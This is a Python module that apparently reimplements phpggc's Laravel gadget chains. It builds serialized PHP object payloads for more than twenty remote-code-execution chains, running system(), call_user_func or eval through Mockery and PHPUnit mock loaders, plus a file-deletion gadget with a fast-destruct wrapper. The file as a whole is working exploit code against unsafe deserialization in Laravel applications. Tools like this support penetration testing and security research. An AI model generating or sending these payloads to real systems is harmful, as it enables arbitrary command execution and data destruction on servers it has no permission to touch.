"""Laravel gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_arr, php_bool, php_null, php_obj, php_ref, php_str, priv, prot, to_bytes


def _request_guard(function: str, parameter: str) -> str:
    return php_obj("Illuminate\\Auth\\RequestGuard", [
        (prot("callback"), php_str("call_user_func")),
        (prot("request"), php_str(function)),
        (prot("provider"), php_str(parameter)),
    ])


def _fc_args(function: str, parameter: str | None, default_fn: str = "system") -> tuple[str, str]:
    if parameter is None:
        return default_fn, function
    return function, parameter


def build_rce1(function: str, parameter: str | None = None, *, fast_destruct: bool = False) -> bytes:
    _, parameter = _fc_args(function, parameter)
    gen = php_obj("Faker\\Generator", [
        (prot("formatters"), php_arr([(php_str("dispatch"), php_str("system"))])),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), gen),
        (prot("event"), php_str(parameter)),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce2(function: str, parameter: str | None = None, *, fast_destruct: bool = True) -> bytes:
    function, parameter = _fc_args(function, parameter)
    inner = "a:1:{i:0;" + php_str(function) + "}"
    dispatcher = php_obj("Illuminate\\Events\\Dispatcher", [
        (prot("listeners"), "a:1:{" + php_str(parameter) + inner + "}"),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), dispatcher),
        (prot("event"), php_str(parameter)),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce3(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    mgr = php_obj("Illuminate\\Notifications\\ChannelManager", [
        (prot("app"), php_str(parameter)),
        (prot("defaultChannel"), php_str("x")),
        (prot("customCreators"), php_arr([(php_str("x"), php_str(function))])),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), mgr),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce4(function: str, parameter: str = "id", *, fast_destruct: bool = False) -> bytes:
    validator = php_obj("Illuminate\\Validation\\Validator", [
        ("extensions", php_arr([(php_str(""), php_str(function))])),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), validator),
        (prot("event"), php_str(parameter)),
    ])
    return maybe_wrap(pending, fast_destruct)


def _mockery_rce5_code(code: str) -> str:
    wrapped = "<?php " + code + " exit; ?>"
    mock_cfg = php_obj("Mockery\\Generator\\MockConfiguration", [
        (prot("name"), php_str("abcdefg")),
    ])
    mock_def = php_obj("Mockery\\Generator\\MockDefinition", [
        (prot("config"), mock_cfg),
        (prot("code"), php_str(wrapped)),
    ])
    bcast = php_obj("Illuminate\\Broadcasting\\BroadcastEvent", [
        ("connection", mock_def),
    ])
    dispatcher = php_obj("Illuminate\\Bus\\Dispatcher", [
        (prot("queueResolver"),
         "a:2:{i:0;" + php_obj("Mockery\\Loader\\EvalLoader", []) + "i:1;" + php_str("load") + "}"),
    ])
    return php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), dispatcher),
        (prot("event"), bcast),
    ])


def build_rce5(code: str, *, fast_destruct: bool = False) -> bytes:
    return maybe_wrap(_mockery_rce5_code(code), fast_destruct)


def build_rce6(code: str, *, fast_destruct: bool = False) -> bytes:
    pending = _mockery_rce5_code(code)
    bag = php_obj("Illuminate\\Support\\MessageBag", [
        (prot("messages"), "a:0:{}"),
        (prot("format"), pending),
    ])
    return maybe_wrap(bag, fast_destruct)


def build_rce7(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    dispatcher = php_obj("Illuminate\\Bus\\Dispatcher", [
        (prot("queueResolver"), php_str(function)),
    ])
    closure = php_obj("Illuminate\\Queue\\CallQueuedClosure", [
        (prot("connection"), php_str(parameter)),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), dispatcher),
        (prot("event"), closure),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce8(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    lazy = php_obj("PhpOption\\LazyOption", [
        (priv("PhpOption\\LazyOption", "callback"), php_str(function)),
        (priv("PhpOption\\LazyOption", "arguments"),
         "a:1:{i:0;" + php_str(parameter) + "}"),
    ])
    req_if = php_obj("Illuminate\\Validation\\Rules\\RequiredIf", [
        ("condition", "a:2:{i:0;" + lazy + "i:1;s:3:\"get\";}"),
    ])
    jar = php_obj("GuzzleHttp\\Cookie\\FileCookieJar", [
        (priv("GuzzleHttp\\Cookie\\FileCookieJar", "filename"), req_if),
    ])
    return maybe_wrap(jar, fast_destruct)


def build_rce9(command: str, *, fast_destruct: bool = True) -> bytes:
    dispatcher = php_obj("Illuminate\\Bus\\Dispatcher", [
        (prot("container"), php_null()),
        (prot("pipeline"), php_null()),
        (prot("pipes"), "a:0:{}"),
        (prot("handlers"), "a:0:{}"),
        (prot("queueResolver"), php_str("system")),
    ])
    bcast = php_obj("Illuminate\\Broadcasting\\BroadcastEvent", [
        ("connection", php_str(command)),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), dispatcher),
        (prot("event"), bcast),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce10(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    guard = php_obj("Illuminate\\Auth\\RequestGuard", [
        ("callback", php_str("call_user_func")),
        ("request", php_str(function)),
        ("provider", php_str(parameter)),
    ])
    req_if = php_obj("Illuminate\\Validation\\Rules\\RequiredIf", [
        ("condition", "a:2:{i:0;" + guard + "i:1;s:4:\"user\";}"),
    ])
    return maybe_wrap(req_if, fast_destruct)


def build_rce11(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    """Uses PHP reference to the _headers array (R:2 bare, R:3 with fast-destruct)."""
    ref_id = 3 if fast_destruct else 2
    headers = php_arr([(php_str("dispatch"), php_str(function))])
    generator = (
        'O:15:"Faker\\Generator":1:{'
        + php_str(prot("formatters"))
        + php_ref(ref_id)
        + "}"
    )
    pending = (
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{'
        + php_str("event")
        + php_str(parameter)
        + php_str("events")
        + generator
        + "}"
    )
    obj = (
        'O:37:"Symfony\\Component\\Mime\\Part\\SMimePart":3:{'
        + php_str(priv("Symfony\\Component\\Mime\\Part\\AbstractPart", "headers"))
        + php_null()
        + php_str(prot("_headers"))
        + headers
        + php_str("inhann")
        + pending
        + "}"
    )
    return maybe_wrap(obj, fast_destruct)


def build_rce12(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    lazy = php_obj("PhpOption\\LazyOption", [
        (priv("PhpOption\\LazyOption", "option"), php_null()),
        (priv("PhpOption\\LazyOption", "callback"), php_str(function)),
        (priv("PhpOption\\LazyOption", "arguments"),
         "a:1:{i:0;" + php_str(parameter) + "}"),
    ])
    repo = php_obj("Illuminate\\Cache\\Repository", [
        (prot("store"), lazy),
    ])
    alias = php_obj("Illuminate\\Foundation\\AliasLoader", [
        (prot("aliases"), "a:1:{i:0;s:3:\"key\";}"),
    ])
    app = php_obj("Symfony\\Component\\Console\\Application", [
        (priv("Symfony\\Component\\Console\\Application", "initialized"), php_bool(True)),
        (priv("Symfony\\Component\\Console\\Application", "commands"), "a:1:{i:0;" + alias + "}"),
        (priv("Symfony\\Component\\Console\\Application", "commandLoader"), repo),
    ])
    factory = php_obj("Illuminate\\View\\Factory", [
        (prot("finder"), app),
    ])
    rsp = php_obj("Illuminate\\Foundation\\Support\\Providers\\RouteServiceProvider", [
        (prot("app"), factory),
    ])
    handler = php_obj("Monolog\\Handler\\RollbarHandler", [
        (priv("Monolog\\Handler\\RollbarHandler", "hasRecords"), php_bool(True)),
        (prot("rollbarLogger"), rsp),
    ])
    return maybe_wrap(handler, fast_destruct)


def build_rce13(function: str, parameter: str | None = None, *, fast_destruct: bool = False) -> bytes:
    function, parameter = _fc_args(function, parameter)
    config = (
        "a:1:{s:6:\"config\";a:2:{"
        "s:16:\"database.default\";" + php_str(function) + ""
        "s:20:\"database.connections\";a:1:{s:6:\"" + function + "\";a:1:{i:0;" + php_str(parameter) + "}}"
        "}}"
    )
    db_mgr = php_obj("Illuminate\\Database\\DatabaseManager", [
        (prot("app"), config),
        (prot("extensions"), "a:1:{s:6:\"" + function + "\";" + php_str("array_filter") + "}"),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), db_mgr),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce14(function: str, parameter: str | None = None, *, fast_destruct: bool = True) -> bytes:
    function, parameter = _fc_args(function, parameter)
    default_gen = php_obj("Faker\\DefaultGenerator", [
        (prot("default"), php_str(parameter)),
    ])
    valid_gen = php_obj("Faker\\ValidGenerator", [
        (prot("generator"), default_gen),
        (prot("maxRetries"), "i:1;"),
        (prot("validator"), php_str(function)),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), valid_gen),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce15(command: str, *, fast_destruct: bool = False) -> bytes:
    guard = _request_guard("system", command)
    qm = php_obj("Illuminate\\Queue\\QueueManager", [
        (prot("app"),
         "a:1:{s:6:\"config\";a:2:{"
         "s:13:\"queue.default\";s:3:\"key\";"
         "s:21:\"queue.connections.key\";a:1:{s:6:\"driver\";s:4:\"func\";"
         "}}}"),
        (prot("connectors"), "a:1:{s:4:\"func\";a:2:{i:0;" + guard + "i:1;s:4:\"user\";}}"),
    ])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), qm),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce16(command: str, *, fast_destruct: bool = False) -> bytes:
    guard = _request_guard("system", command)
    req_if = php_obj("Illuminate\\Validation\\Rules\\RequiredIf", [
        ("condition", "a:2:{i:0;" + guard + "i:1;s:4:\"user\";}"),
    ])
    handler = php_obj("Monolog\\Handler\\RotatingFileHandler", [
        (prot("mustRotate"), php_bool(True)),
        (prot("filename"), php_str("anything")),
        (prot("filenameFormat"), req_if),
        (prot("dateFormat"), php_str("l")),
    ])
    return maybe_wrap(handler, fast_destruct)


def build_rce17(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    conn_val = "a" + parameter
    app = php_arr([
        (php_str("config"), php_arr([
            (php_str("database.default"), php_str(function)),
            (php_str("database.connections"), php_arr([
                (php_str(function), php_str(conn_val)),
            ])),
        ])),
    ])
    db_mgr = php_obj("Illuminate\\Database\\DatabaseManager", [
        (prot("app"), app),
        (prot("factory"), php_str("anything")),
        (prot("extensions"), php_arr([(php_str(function), php_str("array_filter"))])),
    ])
    pending = php_obj("Illuminate\\Routing\\PendingSingletonResourceRegistration", [
        (prot("registrar"), db_mgr),
        (prot("name"), php_str("name")),
        (prot("controller"), php_str("controller")),
        (prot("options"), "a:0:{}"),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce18(code: str, *, fast_destruct: bool = False) -> bytes:
    wrapped = code + "exit;"
    mock = php_obj("PHPUnit\\Framework\\MockObject\\Generator\\MockTrait", [
        (priv("PHPUnit\\Framework\\MockObject\\Generator\\MockTrait", "classCode"), php_str(wrapped)),
        (priv("PHPUnit\\Framework\\MockObject\\Generator\\MockTrait", "mockName"), php_str("asd")),
    ])
    req_if = php_obj("Illuminate\\Validation\\Rules\\RequiredIf", [
        ("condition", "a:2:{i:0;" + mock + "i:1;s:8:\"generate\";}"),
    ])
    jar = php_obj("GuzzleHttp\\Cookie\\FileCookieJar", [
        (priv("GuzzleHttp\\Cookie\\FileCookieJar", "filename"), req_if),
    ])
    return maybe_wrap(jar, fast_destruct)


def build_rce19(command: str, *, fast_destruct: bool = False) -> bytes:
    terminal = php_obj("Laravel\\Prompts\\Terminal", [
        ("initialTtyMode", php_str(";" + command + ";#")),
    ])
    inv = php_obj("Illuminate\\View\\InvokableComponentVariable", [
        ("callable", "a:2:{i:0;" + terminal + "i:1;s:10:\"restoreTty\";}"),
    ])
    sleep = php_obj("Illuminate\\Support\\Sleep", [
        ("shouldSleep", php_bool(True)),
        ("duration", inv),
    ])
    return maybe_wrap(sleep, fast_destruct)


def build_rce20(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    guard = php_obj("Illuminate\\Auth\\RequestGuard", [
        (prot("callback"), php_str(function)),
        (prot("request"), php_str(parameter)),
        (prot("provider"), "i:1;"),
    ])
    req_if = php_obj("Illuminate\\Validation\\Rules\\RequiredIf", [
        ("condition", "a:2:{i:0;" + guard + "i:1;s:4:\"user\";}"),
    ])
    registrar = php_obj("Illuminate\\Routing\\ResourceRegistrar", [
        (prot("router"), php_null()),
    ])
    pending = php_obj("Illuminate\\Routing\\PendingResourceRegistration", [
        (prot("registrar"), registrar),
        (prot("name"), req_if),
        (prot("registered"), php_bool(False)),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce21(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    default = php_obj("Faker\\DefaultGenerator", [
        (prot("default"), php_str(parameter)),
    ])
    valid = php_obj("Faker\\ValidGenerator", [
        (prot("generator"), default),
        (prot("validator"), php_str(function)),
        (prot("maxRetries"), "i:9;"),
    ])
    target = php_obj("Mockery\\Generator\\DefinedTargetClass", [
        (priv("Mockery\\Generator\\DefinedTargetClass", "rfc"), valid),
    ])
    swift = php_obj("Swift_KeyCache_DiskKeyCache", [
        (priv("Swift_KeyCache_DiskKeyCache", "_keys"), php_arr([
            (php_str("fallingskies"), php_arr([
                (php_str("fallingskies"), php_str("fallingskies")),
            ])),
        ])),
        (priv("Swift_KeyCache_DiskKeyCache", "_path"), target),
    ])
    return maybe_wrap(swift, fast_destruct)


def build_rce22(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    chained = php_obj("Illuminate\\Support\\Testing\\Fakes\\ChainedBatchTruthTest", [
        (prot("callback"), php_str(function)),
    ])
    listener = php_obj("League\\CommonMark\\Event\\ListenerData", [
        (priv("League\\CommonMark\\Event\\ListenerData", "event"),
         php_str("\\Illuminate\\Broadcasting\\Channel")),
        (priv("League\\CommonMark\\Event\\ListenerData", "listener"), chained),
    ])
    plist = php_obj("League\\CommonMark\\Util\\PrioritizedList", [
        (priv("League\\CommonMark\\Util\\PrioritizedList", "list"),
         "a:1:{i:0;a:1:{i:0;" + listener + "}}"),
    ])
    env = php_obj("League\\CommonMark\\Environment\\Environment", [
        (priv("League\\CommonMark\\Environment\\Environment", "extensionsInitialized"), php_bool(True)),
        (priv("League\\CommonMark\\Environment\\Environment", "listenerData"), plist),
    ])
    channel = php_obj("Illuminate\\Broadcasting\\Channel", [("name", php_str(parameter))])
    pending = php_obj("Illuminate\\Broadcasting\\PendingBroadcast", [
        (prot("events"), env),
        (prot("event"), channel),
    ])
    return maybe_wrap(pending, fast_destruct)


def build_rce22_fast_destruct(function: str, parameter: str, *, trailing_newline: bool = False) -> bytes:
    out = build_rce22(function, parameter, fast_destruct=True)
    if trailing_newline:
        out += b"\n"
    return out


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    file_obj = php_obj("Laravel\\Pail\\File", [("file", php_str(remote_path))])
    cmd = php_obj("Laravel\\Pail\\Console\\Commands\\PailCommand", [("file", file_obj)])
    return maybe_wrap(cmd, fast_destruct)
